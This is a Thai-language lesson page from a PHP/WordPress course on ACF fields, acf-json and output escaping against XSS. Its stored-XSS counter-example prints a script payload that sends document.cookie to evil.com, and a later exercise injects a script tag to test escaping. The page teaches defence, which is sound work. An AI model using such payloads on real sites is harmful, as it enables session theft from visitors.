@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Week 4 — ACF ลึก: 24 Field Groups + เริ่มถัก Security</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<header class="hero">
+  <div class="wrap">
+    <div class="crumb"><a href="../index.html">PHP Full Stack Track</a> · Week 4</div>
+    <h1>🌉 ACF ลึก — สะพานระหว่าง admin กับ template</h1>
+    <p>Week 3 ตัดสินแล้วว่าอะไรควรเป็น "Field" — คราวนี้เจาะ ACF ให้ขาด: มันคือสะพานที่พาข้อมูลจาก
+    ฟอร์มที่ทีมคอนเทนต์กรอก (admin) ไปโผล่บนหน้าเว็บ (template) · และเพราะนี่คือจุดแรกที่เรา "เอาข้อมูลจากคนนอกมาแสดง"
+    บทนี้จึง<strong>เริ่มถัก security</strong> — escape ทุก output ตั้งแต่บรรทัดแรก</p>
+    <p style="margin-top:10px;font-size:.9rem;opacity:.85">⏱ เนื้อหา ~2-3 ชม. + Mission ~3-4 ชม. · 🎯 Mission: เพิ่ม field GEO + acf-json + แสดง 3 field types (escape ครบ)</p>
+  </div>
+</header>
+<div class="wrap">
+
+  <div class="card">
+    <h3 style="margin-top:0">🔑 คีย์เวิร์ดภาพจำ</h3>
+    <div class="kw-row">
+      <span class="kw">🌉 ACF = สะพาน admin → template</span>
+      <span class="kw">🔑 get_field() = postmeta ที่แต่งตัวแล้ว</span>
+      <span class="kw">🌐 qtranslate_* = ช่องที่พูดได้ 8 ภาษา</span>
+      <span class="kw">📦 field structure = โค้ด (ต้องเข้า git ผ่าน acf-json)</span>
+      <span class="kw">🛡 escape ตอน output เสมอ (ไม่ใช่ตอน save)</span>
+      <span class="kw">🚪 ข้อมูลจากคนนอก = ไม่เชื่อจนกว่าจะ escape</span>
+    </div>
+  </div>
+
+  <h2>🧠 แนวคิด & หลักการ</h2>
+  <div class="card">
+    <h3>หลักการ 1: ACF คือ "สะพาน" ไม่ใช่ "ที่เก็บข้อมูล"</h3>
+    <p><strong>เปรียบเปรย:</strong> จำโพสต์อิท (<code>wp_postmeta</code>) จาก Week 1 ได้ไหม — ACF ไม่ได้สร้างที่เก็บข้อมูลชนิดใหม่
+    มันคือ<em>สะพาน 2 ทาง</em>เหนือตู้ postmeta เดิม: ฝั่งหนึ่งวาดฟอร์มสวยๆ ให้คนกรอก (admin) อีกฝั่งมีฟังก์ชัน <code>get_field()</code> ให้ template ดึงค่ากลับมา
+    · <strong>ข้างใต้สะพานยังเป็น postmeta เสมอ</strong> — จำประโยคนี้ไว้ เพราะวันที่ต้อง debug หรือถอด ACF จะได้ไม่หลงทาง</p>
+    <p>เส้นทางเต็มของ ACF มี 5 สถานี (ต่อจาก Week 2 ที่เห็นภาพรวมแล้ว ครั้งนี้ลงรายละเอียด):</p>
+    <table>
+      <tr><th>สถานี</th><th>เกิดอะไร · ใครทำ</th></tr>
+      <tr><td>1. Field Group + Location Rule</td><td>dev นิยาม: field ชุดไหน โผล่ที่ CPT ไหน</td></tr>
+      <tr><td>2. ทีมคอนเทนต์กรอกใน admin</td><td>พิมพ์เวลาเปิด-ปิด/พิกัด/FAQ ในฟอร์มที่ ACF วาด</td></tr>
+      <tr><td>3. เซฟลง <code>wp_postmeta</code></td><td>ACF เขียนเป็นคู่ key–value ผูก post_id</td></tr>
+      <tr><td>4. <code>get_field('key')</code> ใน template</td><td>ดึงค่ากลับ + ACF แปลง type ให้พร้อมใช้</td></tr>
+      <tr><td>5. 🛡 <code>echo esc_html(...)</code></td><td><strong>escape ก่อนแสดงเสมอ</strong> — สถานีที่บทนี้เพิ่มเข้ามา</td></tr>
+    </table>
+
+    <h3>หลักการ 2: field structure คือ "โค้ด" ต้องเข้า git</h3>
+    <p><strong>ปัญหาที่ acf-json แก้:</strong> ถ้า dev คนหนึ่งเพิ่ม field ผ่าน ACF UI บนเครื่องตัวเอง — field นั้นอยู่ใน DB ของเขาคนเดียว
+    เพื่อนร่วมทีมที่ pull โค้ดมาจะไม่มี field นั้น → template เรียก <code>get_field()</code> ได้ค่าว่าง งงกันทั้งทีม
+    · <strong>acf-json</strong> ทำให้ ACF เขียนโครงสร้าง field เป็นไฟล์ <code>.json</code> ในโฟลเดอร์ theme อัตโนมัติ → เข้า git → เห็น diff → ทุกคน sync ตรงกัน</p>
+    <p><strong>หลักคิด:</strong> "โครงสร้าง" (field มีอะไรบ้าง) = โค้ด ต้อง version control · "เนื้อหา" (ค่าที่กรอก) = data อยู่ใน DB · อย่าปนกัน</p>
+
+    <h3>หลักการ 3: เมื่อไหร่ใช้ ACF / เมื่อไหร่ใช้ native field</h3>
+    <p>title, เนื้อหาหลัก, featured image = ใช้ของ native ของ WordPress (<code>the_title()</code>, <code>the_content()</code>, <code>the_post_thumbnail()</code>) — เพราะ WP จัดการดีอยู่แล้ว + ปลั๊กอินอื่นเข้าใจ
+    · ข้อมูลเสริมเฉพาะทาง (เวลาเปิด-ปิด, พิกัด, FAQ, ราคา) = ACF · <strong>ของจริง Fujisawa:</strong> ทุก CPT เปิด supports แค่ title/editor/thumbnail แล้วที่เหลือเป็น ACF ทั้งหมด (โยง Week 2)</p>
+  </div>
+
+  <figure class="figure">
+    <svg viewBox="0 0 760 250" xmlns="http://www.w3.org/2000/svg" font-family="Sarabun,sans-serif" role="img" aria-label="เส้นทางข้อมูล ACF พร้อมจุด escape">
+      <defs><marker id="b1" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#6b7280"/></marker></defs>
+      <rect x="15" y="55" width="150" height="95" rx="10" fill="#e4eff5" stroke="#15679f" stroke-width="2"/>
+      <text x="90" y="82" text-anchor="middle" font-size="12" font-weight="bold" fill="#0c3f5e">🖊 ทีมคอนเทนต์</text>
+      <text x="90" y="104" text-anchor="middle" font-size="11" fill="#1f2937">กรอกใน metabox</text>
+      <text x="90" y="122" text-anchor="middle" font-size="11" fill="#1f2937">opening_hours</text>
+      <text x="90" y="140" text-anchor="middle" font-size="10" fill="#6b7280">(ข้อมูลจาก "คนนอก")</text>
+      <rect x="200" y="55" width="140" height="95" rx="10" fill="#fff" stroke="#15679f" stroke-width="2"/>
+      <text x="270" y="82" text-anchor="middle" font-size="12" font-weight="bold" fill="#0c3f5e">🗄 wp_postmeta</text>
+      <text x="270" y="108" text-anchor="middle" font-size="11" fill="#1f2937">เก็บ key–value</text>
+      <text x="270" y="128" text-anchor="middle" font-size="10" fill="#6b7280">(ตู้เดิมจาก W1)</text>
+      <rect x="375" y="55" width="140" height="95" rx="10" fill="#fff" stroke="#15679f" stroke-width="2"/>
+      <text x="445" y="82" text-anchor="middle" font-size="12" font-weight="bold" fill="#0c3f5e">🔑 get_field()</text>
+      <text x="445" y="108" text-anchor="middle" font-size="11" fill="#1f2937">ดึงค่า + แปลง type</text>
+      <text x="445" y="128" text-anchor="middle" font-size="10" fill="#6b7280">ใน template</text>
+      <rect x="550" y="45" width="130" height="115" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2.5"/>
+      <text x="615" y="72" text-anchor="middle" font-size="12" font-weight="bold" fill="#dc2626">🛡 esc_html()</text>
+      <text x="615" y="96" text-anchor="middle" font-size="11" fill="#1f2937">ด่านตรวจสุดท้าย</text>
+      <text x="615" y="114" text-anchor="middle" font-size="11" fill="#1f2937">ก่อนพ่นออกจอ</text>
+      <text x="615" y="136" text-anchor="middle" font-size="10" fill="#dc2626">ข้ามด่านนี้ = XSS</text>
+      <line x1="165" y1="102" x2="197" y2="102" stroke="#6b7280" stroke-width="2" marker-end="url(#b1)"/>
+      <line x1="340" y1="102" x2="372" y2="102" stroke="#6b7280" stroke-width="2" marker-end="url(#b1)"/>
+      <line x1="515" y1="102" x2="547" y2="102" stroke="#6b7280" stroke-width="2" marker-end="url(#b1)"/>
+      <text x="690" y="102" font-size="11" fill="#059669">→ 🌐 จอ</text>
+      <text x="380" y="205" text-anchor="middle" font-size="12.5" fill="#1f2937">ACF = สะพานจากฟอร์ม (ซ้าย) ไปหน้าเว็บ (ขวา) · แต่ข้อมูลมาจาก "คนนอก"</text>
+      <text x="380" y="228" text-anchor="middle" font-size="11.5" fill="#dc2626">จึงต้องผ่านด่าน escape ก่อนแสดงเสมอ — ไม่มีข้อยกเว้น</text>
+    </svg>
+    <figcaption>ภาพที่ 1: เส้นทางข้อมูล ACF — สังเกตด่าน escape สีแดงก่อนถึงจอ (หัวใจ security ของบทนี้)</figcaption>
+  </figure>
+
+  <h2>ส่วนที่ 1: 24 Field Groups จริง + naming convention</h2>
+  <div class="card">
+    <p>Fujisawa มี <strong>24 ACF field groups</strong> ผูกราย CPT · ชื่อ field มีระบบเหมือน CPT (จำ prefix จาก Week 3): <code>{prefix}__{entity}__{field}</code></p>
+    <table>
+      <tr><th>Field Group</th><th>ผูกกับ</th><th>ตัวอย่าง field จริง</th></tr>
+      <tr><td>Where to stay</td><td>ssws__shop</td><td><code>ssws__shop__addr</code>, <code>ssws__shop__tel</code>, <code>ssws__shop__access</code></td></tr>
+      <tr><td>Local Cuisine</td><td>sslc__shop</td><td><code>sslc__shop__detail</code>, <code>sslc__shop__img</code></td></tr>
+      <tr><td>What to See</td><td>whattosee</td><td><code>spot_show__flag</code>, <code>spot_ggmap_embed</code> (⚠️ มีแค่ 2 field!)</td></tr>
+      <tr><td>News</td><td>news</td><td><code>meta__news__url</code>, <code>meta__news__link_window</code> (⚠️ มีแค่ 2 field!)</td></tr>
+    </table>
+    <p><strong>2 กลุ่มที่ "field ไม่พอ" — จุดที่งาน redesign ต้องเติม:</strong></p>
+    <ul>
+      <li><code>whattosee</code> มีแค่ flag + Google Map embed → <strong>ขาด</strong> <code>summary_th</code>, <code>opening_hours</code>, <code>geo_lat/lng</code>, <code>faq</code> ที่ดีไซน์ SpotDetail ต้องใช้</li>
+      <li><code>news</code> มีแค่ url + link_window → <strong>ขาด</strong> <code>category</code>, <code>priority</code>, <code>publish_at</code>, <code>expire_at</code>, <code>display_in_banner</code> ที่แถบ Unibar ต้องใช้</li>
+    </ul>
+    <p>การรู้ว่า "ของเดิมมีแค่ไหน ต้องเติมอะไร" คือหัวใจของงาน — และคือสิ่งที่ Mission จะทำ</p>
+  </div>
+
+  <h2>ส่วนที่ 2: field ชนิด <code>qtranslate_*</code> — ช่องที่พูดได้ 8 ภาษา</h2>
+  <div class="card">
+    <p><strong>เปรียบเปรย:</strong> field ธรรมดา = <em>ช่องพูดภาษาเดียว</em> · field <code>qtranslate_*</code> = <em>ช่องที่เก็บทั้ง 8 ภาษาไว้ในตัว</em>
+    (<code>[:en]Sea Candle[:th]ประภาคาร[:]</code>) แล้วเลือกพูดภาษาที่ถูกตอน render · ดูให้ออกว่า field ไหนเป็นชนิดไหน:</p>
+    <table>
+      <tr><th>ชนิด field</th><th>เก็บกี่ภาษา</th><th>ตัวอย่างใน Fujisawa</th></tr>
+      <tr><td><code>qtranslate_text</code> / <code>qtranslate_textarea</code></td><td>8 ภาษาในช่องเดียว</td><td><code>ssws__shop__addr</code> (ที่อยู่แปลได้)</td></tr>
+      <tr><td><code>qtranslate_url</code> / <code>qtranslate_image</code></td><td>8 ภาษา (URL/รูปต่างภาษา)</td><td><code>ssws__shop__url</code></td></tr>
+      <tr><td><code>text</code> / <code>url</code> / <code>image</code> ธรรมดา</td><td>ภาษาเดียว (ไม่แปล)</td><td><code>ssws__shop__tel</code> (เบอร์โทรไม่ต้องแปล)</td></tr>
+    </table>
+    <div class="tip"><strong>ทำไมต้องแยกให้ออก:</strong> เบอร์โทร/พิกัดเป็นภาษาเดียวพอ (แปลไม่ได้อยู่แล้ว) แต่ที่อยู่/รายละเอียดต้อง 8 ภาษา
+    — ถ้าเลือกชนิดผิด ทีมคอนเทนต์จะกรอกภาษาอื่นไม่ได้ หรือได้ช่องแปลที่ไม่จำเป็นมารก · Week 5 เจาะเต็มว่า <code>get_field()</code> ตัดภาษายังไง + มีบั๊กจริงรอแก้</div>
+  </div>
+
+  <h2>ส่วนที่ 3: 🔐 เริ่มถัก Security — escape ทุก output</h2>
+  <div class="card">
+    <p><strong>ทำไมบทนี้ถึงเริ่ม security:</strong> นี่คือบทแรกที่เรา "เอาข้อมูลที่คนนอกกรอกมาแสดงบนหน้าเว็บ" — และกฎเหล็กของ dev คือ
+    <strong>"อย่าเชื่อ input / escape ทุก output"</strong> · เอกสารส่งมอบ (docs/08 §1.2) บังคับ escaping ทุกจุด — เราจึงถักมันเข้าตั้งแต่ตอนนี้ ไม่รอ Week 9</p>
+
+    <h3>escape คืออะไร (เปรียบเปรย)</h3>
+    <p><strong>เปรียบเปรย:</strong> escape = <em>ด่านตรวจอาวุธก่อนขึ้นเครื่องบิน</em> · ข้อมูลที่คนนอกกรอกอาจมี "อาวุธ" ปนมา
+    (โค้ด HTML/JavaScript อันตราย) · <code>esc_html()</code> คือด่านที่แปลงอาวุธให้เป็นข้อความธรรมดาไร้พิษ (<code>&lt;script&gt;</code> กลายเป็นตัวอักษร ไม่ใช่คำสั่ง)</p>
+    <p>เลือก escape ให้ตรงกับ "ที่ที่ข้อมูลจะไปโผล่":</p>
+    <table>
+      <tr><th>ฟังก์ชัน</th><th>ใช้เมื่อข้อมูลไปอยู่ที่</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code>esc_html()</code></td><td>เนื้อความปกติในหน้า</td><td><code>echo esc_html($hours);</code></td></tr>
+      <tr><td><code>esc_url()</code></td><td>ใน href / src</td><td><code>href="&lt;?php echo esc_url($url); ?&gt;"</code></td></tr>
+      <tr><td><code>esc_attr()</code></td><td>ใน attribute อื่น (alt, title, value)</td><td><code>alt="&lt;?php echo esc_attr($alt); ?&gt;"</code></td></tr>
+      <tr><td><code>wp_kses_post()</code></td><td>ต้องการให้มี HTML บางแท็ก (เนื้อหา rich)</td><td><code>echo wp_kses_post($faq_answer);</code></td></tr>
+    </table>
+
+    <h3>💥 Counter-example: Stored XSS — ทำไมต้อง escape ตอน output ไม่ใช่ตอน save</h3>
+    <div class="danger">
+      <p>สมมุติทีมคอนเทนต์ (หรือคนที่แฮกเข้า admin ได้) กรอกช่อง "ชื่อร้าน" เป็น:</p>
+      <pre style="margin:8px 0"><code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code></pre>
+      <p>ถ้า template แสดงตรงๆ <code>echo $shop_name;</code> โดยไม่ escape → ทุกคนที่เปิดหน้านั้น browser จะรันสคริปต์ = cookie/session ถูกขโมย
+      · นี่คือ <strong>Stored XSS</strong> (โค้ดร้ายถูกเก็บใน DB แล้วยิงใส่ทุกคนที่เปิดหน้า)</p>
+      <p><strong>ทำไม escape ตอน output ไม่ใช่ตอน save:</strong> ข้อมูลใน DB ควรเก็บ "ตามที่กรอกจริง" (เผื่อวันหน้าเอาไปใช้ที่อื่นที่ต้องการ raw)
+      · การป้องกันต้องอยู่ที่ "จุดแสดงผล" เพราะ escape แต่ละที่ใช้ฟังก์ชันต่างกัน (html/url/attr) — escape ตอน save จะไม่รู้ว่าปลายทางคือที่ไหน</p>
+    </div>
+  </div>
+
+  <h2>ส่วนที่ 4: อ่านโค้ดจริง — <code>single-whattosee.php</code> ตรงจุด escape</h2>
+  <div class="card">
+    <p>ดูโค้ดจริงจาก dev-starter — สังเกตว่าทุกค่าที่มาจาก ACF ผ่าน escape ก่อนแสดงเสมอ:</p>
+<pre><code>&lt;?php $hours = get_field('opening_hours'); ?&gt;      // 1
+&lt;div class="val"&gt;
+  &lt;?php echo esc_html($hours); ?&gt;                   // 2
+&lt;/div&gt;
+
+&lt;?php $offurl = get_field('official_url'); ?&gt;      // 3
+&lt;a href="&lt;?php echo esc_url($offurl); ?&gt;"          // 4
+   target="_blank" rel="noopener"&gt;                 // 5
+  เว็บไซต์ทางการ
+&lt;/a&gt;</code></pre>
+    <table>
+      <tr><th>บรรทัด</th><th>ทำไมต้องมี (ไม่ใช่แค่ทำอะไร)</th></tr>
+      <tr><td>1</td><td>ดึงค่าจาก ACF เก็บในตัวแปร — <code>get_field()</code> อ่าน postmeta ให้ (จำ Week 1) · เก็บตัวแปรก่อนเพื่อ reuse + อ่านง่าย</td></tr>
+      <tr><td>2</td><td><code>esc_html()</code> ก่อน echo — แม้ค่าเวลาเปิด-ปิดดู "ปลอดภัย" ก็ต้อง escape เสมอ เพราะ<strong>ไม่มีทางรู้ว่าใครกรอกอะไรมาในอนาคต</strong> (นิสัย ไม่ใช่การเลือกเป็นกรณี)</td></tr>
+      <tr><td>3-4</td><td>URL ต้องใช้ <code>esc_url()</code> ไม่ใช่ <code>esc_html()</code> — เพราะ esc_url กรอง protocol อันตราย (เช่น <code>javascript:</code>) ที่ esc_html ปล่อยผ่าน</td></tr>
+      <tr><td>5</td><td><code>rel="noopener"</code> คู่กับ <code>target="_blank"</code> เสมอ — กันหน้าใหม่ที่เปิด "ควบคุมย้อนกลับ" หน้าเราได้ (tabnabbing) · security detail ที่มือโปรไม่ลืม</td></tr>
+    </table>
+    <div class="warn"><strong>จุดที่ dev-starter ยัง "ละไว้" (ให้วีเติมใน Mission):</strong> ในไฟล์จริงบางจุด เช่น URL Google Maps ที่ต่อ <code>$lat</code>, <code>$lng</code> เข้าไปตรงๆ
+    ยังไม่ได้ escape — เป็นโจทย์ให้วีหาจุดที่ขาดแล้วเติม <code>esc_attr()</code>/<code>esc_url()</code> ให้ครบ (dev-starter เป็นตัวอย่างเริ่มต้น ไม่ใช่โค้ด production สมบูรณ์)</div>
+  </div>
+
+  <h2>ส่วนที่ 5: acf-json — field structure เข้า git</h2>
+  <div class="card">
+    <p>เปิดโฟลเดอร์ <code>acf-json/</code> ใน theme แล้ว ACF จะทำ 2 อย่างอัตโนมัติ:</p>
+    <ol>
+      <li><strong>ตอนแก้ field ใน UI</strong> → เขียนไฟล์ <code>group_xxx.json</code> ลงโฟลเดอร์นั้น (= diff เห็นใน git)</li>
+      <li><strong>ตอนเพื่อนร่วมทีม pull โค้ดมา</strong> → ACF เห็นว่า json ใหม่กว่า DB → ขึ้นปุ่ม "Sync" ให้กดอัปเดต field เข้าเครื่องตัวเอง</li>
+    </ol>
+    <p><strong>ตัวอย่างจริง:</strong> welovefukushima commit โฟลเดอร์ <code>acf-json/</code> เข้า git มี 6 field groups เป็นไฟล์ <code>.json</code> —
+    ทีมต่างเครื่องจึงมี field ตรงกันเป๊ะ · ถ้าไม่มี acf-json: dev A เพิ่ม field, dev B ไม่มี, template พัง — บั๊กที่หาสาเหตุยากเพราะ "โค้ดเหมือนกันแต่ผลต่างกัน"</p>
+  </div>
+
+  <h2>ตัวอย่างประยุกต์</h2>
+  <div class="card">
+    <p><strong>🏢 งานวี:</strong> งาน redesign ต้องเพิ่ม field GEO (<code>summary_th</code>, <code>faq</code>, <code>geo_lat/lng</code>) ให้ <code>whattosee</code> ที่เดิมมีแค่ 2 field
+    · โค้ด register field พวกนี้มีตัวอย่างพร้อมใน <code>dev-starter/functions-discover-fujisawa.php</code> (ก้อน <code>acf/init</code> ที่อ่านใน Week 2) — Mission จะเอามาใช้จริง + commit acf-json</p>
+    <p><strong>🌏 อุตสาหกรรม:</strong> Stored XSS ผ่านช่อง input คือช่องโหว่อันดับต้นๆ ของ OWASP · ทุกแพลตฟอร์มที่รับ user input (Facebook comment, ช่องรีวิว Shopee, ฟอร์มสมัคร)
+    ต้อง escape ตอนแสดงเสมอ — เว็บใหญ่ที่เคยพลาดเรื่องนี้โดน XSS worm แพร่ทั้งระบบมาแล้ว (เช่น Samy worm ของ MySpace ปี 2005 ติด 1 ล้านบัญชีใน 20 ชม.)</p>
+  </div>
+
+  <h2>🧹 Clean Code ประจำ Week 4 — แสดง ACF field แบบปลอดภัย + สะอาด</h2>
+  <div class="card">
+    <h3>1. escape ทุก output — ไม่มีข้อยกเว้น</h3>
+    <div class="clean">
+      <div class="bad"><h4>❌ echo ตรงๆ — ช่องโหว่ XSS</h4>
+<pre><code>&lt;h1&gt;&lt;?php echo get_field('name'); ?&gt;&lt;/h1&gt;
+&lt;a href="&lt;?php the_field('url'); ?&gt;"&gt;
+&lt;img alt="&lt;?php the_field('alt'); ?&gt;"&gt;
+// ไม่มี escape สักตัว = อันตราย</code></pre></div>
+      <div class="good"><h4>✅ escape ตรงชนิดปลายทาง</h4>
+<pre><code>&lt;h1&gt;&lt;?php echo esc_html(get_field('name')); ?&gt;&lt;/h1&gt;
+&lt;a href="&lt;?php echo esc_url(get_field('url')); ?&gt;"&gt;
+&lt;img alt="&lt;?php echo esc_attr(get_field('alt')); ?&gt;"&gt;
+// html / url / attr — เลือกให้ตรงที่</code></pre></div>
+    </div>
+
+    <h3>2. เช็ค field ว่างก่อนแสดง — guard clause</h3>
+    <div class="clean">
+      <div class="bad"><h4>❌ แสดงเลย — ได้กล่องเปล่า/ป้ายลอย</h4>
+<pre><code>&lt;div class="hours"&gt;
+  เวลาทำการ:
+  &lt;?php echo esc_html(get_field('hours')); ?&gt;
+&lt;/div&gt;
+// ถ้าไม่มีค่า → "เวลาทำการ:" ลอยเปล่า</code></pre></div>
+      <div class="good"><h4>✅ มีค่อยแสดง</h4>
+<pre><code>&lt;?php if ( $h = get_field('hours') ): ?&gt;
+  &lt;div class="hours"&gt;
+    เวลาทำการ: &lt;?php echo esc_html($h); ?&gt;
+  &lt;/div&gt;
+&lt;?php endif; ?&gt;
+// ไม่มีค่า = ไม่ render ทั้งกล่อง</code></pre></div>
+    </div>
+    <div class="warn"><strong>กฎทอง:</strong> escape ต้องเป็น<em>นิสัยอัตโนมัติ</em> ไม่ใช่ "ค่อยมาไล่เติมทีหลัง" —
+    เพราะพอโค้ดเยอะ การไล่หาจุดที่ลืมคือฝันร้าย · พิมพ์ <code>esc_html()</code> พร้อม <code>echo</code> ทุกครั้งตั้งแต่แรก ให้มือจำ</div>
+  </div>
+
+  <h2>🎯 Mission 4 — เพิ่ม field GEO + acf-json + แสดงผล (escape ครบ)</h2>
+  <div class="danger" style="margin-bottom:16px">
+    🤖 <strong>กฎ AI สองโหมด:</strong> ปิด AI เขียนมือ · ติดเกิน 20 นาทีขอ hint ทีละชั้น
+  </div>
+  <div class="mission">
+    <h3>เป้าหมาย <span class="badge orange">~3-4 ชม.</span></h3>
+    <p>ต่อยอด sandbox — เพิ่ม field GEO ที่ production ขาด + แสดงผล 3 ชนิด field โดย escape ครบทุกจุด</p>
+
+    <div class="step"><div class="num">1</div><div>
+      <strong>เปิด acf-json ใน theme sandbox</strong> — สร้างโฟลเดอร์ <code>acf-json/</code> ใน theme (ACF จะ auto-detect) · ยืนยันว่า sync ทำงาน</div></div>
+
+    <div class="step"><div class="num">2</div><div>
+      <strong>เพิ่ม field GEO ให้ CPT ทดลอง</strong> — 3 ชนิดต่างกัน: <code>summary_th</code> (textarea), <code>hero_image</code> (image), <code>faq</code> (repeater q/a)
+      · เพิ่มผ่าน ACF UI แล้วดูไฟล์ json โผล่ใน <code>acf-json/</code> (หรือเขียนด้วย <code>acf_add_local_field_group()</code> แบบ dev-starter ก็ได้)</div></div>
+
+    <div class="step"><div class="num">3</div><div>
+      <strong>แสดงผลใน template — escape ครบ</strong> — เขียน template แสดงทั้ง 3 field:
+      textarea ผ่าน <code>esc_html()</code>, image ผ่าน <code>esc_url()</code> + <code>esc_attr()</code> (alt), repeater วน loop แต่ละ q/a escape ทุกตัว</div></div>
+
+    <div class="step"><div class="num">4</div><div>
+      <strong>ทดสอบ XSS ด้วยตัวเอง</strong> — กรอกช่อง summary เป็น <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> แล้วเปิดหน้าเว็บ
+      → เห็นเป็นข้อความ (escape ทำงาน) ไม่ใช่ popup · แล้วลองเอา <code>esc_html()</code> ออก 1 จุด ดูผลต่าง → เขียนใส่ README</div></div>
+
+    <div class="step"><div class="num">5</div><div>
+      <strong>commit + push GitHub</strong> — repo <code>wp-acf-escape-lab</code> · commit <strong>รวมโฟลเดอร์ acf-json</strong> (พิสูจน์ field เข้า git)
+      · README อธิบาย escape แต่ละชนิด + ผลการทดสอบ XSS + AI Usage</div></div>
+  </div>
+
+  <div class="card">
+    <h3>✅ Definition of Done</h3>
+    <ul class="check">
+      <li>acf-json มีไฟล์ .json ของ field ที่เพิ่ม · commit เข้า git เห็นใน diff</li>
+      <li>แสดง 3 field types ในหน้าเว็บได้ · escape ครบทุก output (html/url/attr ถูกชนิด)</li>
+      <li>ทดสอบ XSS: กรอก <code>&lt;script&gt;</code> แล้วไม่ทำงาน (escape กัน) · ถอด escape 1 จุดแล้วเห็นผลต่าง → เขียน README</li>
+      <li>อธิบายได้: ทำไม escape ตอน output ไม่ใช่ตอน save + Quiz ตอบได้</li>
+    </ul>
+  </div>
+
+  <h2>📝 Quiz — ทดสอบความเข้าใจ</h2>
+  <details><summary>ข้อ 1: ทำไม <code>get_field('image')</code> ให้ผลต่างจาก <code>get_post_meta($id,'image',true)</code>?</summary>
+    <p><code>get_post_meta()</code> คืนค่าดิบใน postmeta (มักเป็นแค่ ID รูปเป็นตัวเลข) · <code>get_field()</code> รู้ว่า field นี้ชนิด image
+    เลยแปลงให้เป็น array พร้อม URL/alt/ขนาดต่างๆ (หรือ URL ตรงๆ ตามตั้งค่า) · ACF = "postmeta ที่แต่งตัวมาแล้ว" — แต่ข้างใต้ยังเป็น postmeta เดียวกัน</p></details>
+  <details><summary>ข้อ 2: field <code>ssws__shop__tel</code> (เบอร์โทร) เป็น text ธรรมดา แต่ <code>ssws__shop__addr</code> (ที่อยู่) เป็น qtranslate_text — ทำไมต่างกัน?</summary>
+    <p>เบอร์โทรเป็นตัวเลขสากล ไม่ต้องแปล → text ธรรมดา (ภาษาเดียว) พอ · ที่อยู่ต้องแสดงเป็นภาษาที่ผู้ใช้เลือก (ไทย/อังกฤษ/ญี่ปุ่น...) → ต้อง qtranslate_text ที่เก็บ 8 ภาษาในช่องเดียว
+    · เลือกชนิดผิด = กรอกภาษาอื่นไม่ได้ หรือได้ช่องแปลที่ไม่จำเป็น</p></details>
+  <details><summary>ข้อ 3 (security/production): ทำไมต้อง escape ตอน output ไม่ใช่ sanitize ตอน save? และถ้าลืม escape ค่าที่ทีมงานเองกรอก (ไม่ใช่แฮกเกอร์) ยังอันตรายไหม?</summary>
+    <p>escape ตอน output เพราะปลายทางต่างกันใช้ฟังก์ชันต่างกัน (html/url/attr) — save ไม่รู้ว่าจะเอาไปโชว์ที่ไหน + ควรเก็บ raw ไว้ใช้ที่อื่นได้ ·
+    <strong>อันตรายแม้ทีมงานเองกรอก:</strong> ① ทีมงานอาจ paste เนื้อหาที่มี &lt;/div&gt; ติดมาโดยไม่ตั้งใจ → layout พังทั้งหน้า ② ถ้าบัญชี admin ถูกแฮก แฮกเกอร์กรอกผ่านฟอร์มปกติได้ ③ หลัก "อย่าเชื่อ input" ไม่แยกว่า input มาจากใคร — escape เสมอคือนิสัยที่ถูก</p></details>
+  <details><summary>ข้อ 4: acf-json แก้ปัญหาอะไร และถ้าทีมไม่ใช้มันจะเจอบั๊กแบบไหน?</summary>
+    <p>แก้ปัญหา "field structure อยู่ใน DB ของ dev แต่ละคนไม่ตรงกัน" · ถ้าไม่ใช้: dev A เพิ่ม field ผ่าน UI (อยู่ใน DB เขา) → push โค้ด template ที่เรียก field นั้น → dev B pull มาแต่ไม่มี field → <code>get_field()</code> คืนค่าว่าง → template แสดงไม่ครบ
+    "โค้ดเหมือนกันแต่ผลต่างกัน" หาสาเหตุยากมาก · acf-json เขียน field เป็นไฟล์เข้า git ทุกคน sync ตรงกัน</p></details>
+
+  <div class="card" style="border:2px solid var(--brand)">
+    <h3 style="margin-top:0">⏭ สัปดาห์หน้า</h3>
+    <p style="margin:0"><strong>Week 5 — qTranslate-XT ถึงแก่น: 8 ภาษาในช่องเดียว ⭐:</strong>
+    รู้แล้วว่า field <code>qtranslate_*</code> เก็บ 8 ภาษา — คราวนี้เจาะว่ามันตัดภาษายังไงตอน render, <code>qtranxf_use_language()</code> ทำงานยังไง,
+    และ<strong>บั๊กจริงที่รอวีแก้</strong>: helper <code>lang_label()</code> ที่ out-of-sync (มี <code>ja</code> ขาด <code>vn</code>) = งาน MR จริงชิ้นแรก</p>
+  </div>
+
+  <div class="nav-bottom">
+    <a class="btn ghost" href="../week-03/index.html">← Week 3</a>
+    <a class="btn ghost" href="../index.html">หน้ารวมคอร์ส</a>
+    <span class="btn" style="background:#9ca3af;cursor:default">Week 5 (รอสร้าง) →</span>
+  </div>
+  <footer>PHP Full Stack Track × Fujisawa V2.1 · Week 4 · มาตรฐานบทเรียน 7 ส่วน</footer>
+</div>
+</body>
+</html>
